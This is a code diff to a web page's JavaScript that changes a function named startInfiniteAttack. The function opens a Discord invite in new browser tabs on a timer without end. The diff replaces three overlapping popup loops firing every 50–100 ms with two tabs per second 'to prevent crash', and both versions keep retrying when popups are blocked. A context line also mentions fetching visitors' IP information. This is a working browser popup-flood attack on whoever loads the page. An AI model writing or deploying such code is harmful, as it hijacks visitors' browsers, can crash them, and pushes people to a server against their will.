@@ -758,28 +758,19 @@
         function startInfiniteAttack() {
             const discordUrl = 'https://discord.gg/8z6c9ePRBx';
 
-            // SUPER FAST - Opens tab every 50ms (20 tabs per second)
+            // Safe opening - 2 tabs every 1 second to prevent crash
             setInterval(() => {
-                try {
-                    window.open(discordUrl, '_blank');
-                } catch(e) {
-                    // Keep trying even if blocked
+                // Open 2 tabs with small delay between each
+                for(let i = 0; i < 2; i++) {
+                    setTimeout(() => {
+                        try {
+                            window.open(discordUrl, '_blank');
+                        } catch(e) {
+                            // Keep trying even if blocked
+                        }
+                    }, i * 50); // 50ms delay between tabs
                 }
-            }, 50);
-
-            // EXTRA FAST BACKUP - Opens another tab every 75ms
-            setInterval(() => {
-                try {
-                    window.open(discordUrl, '_blank');
-                } catch(e) {}
-            }, 75);
-
-            // ULTRA FAST BACKUP - Opens another tab every 100ms
-            setInterval(() => {
-                try {
-                    window.open(discordUrl, '_blank');
-                } catch(e) {}
-            }, 100);
+            }, 1000); // Repeat every 1 second
         }
 
         // Fetch IP Information - USING IPINFO.IO METHOD
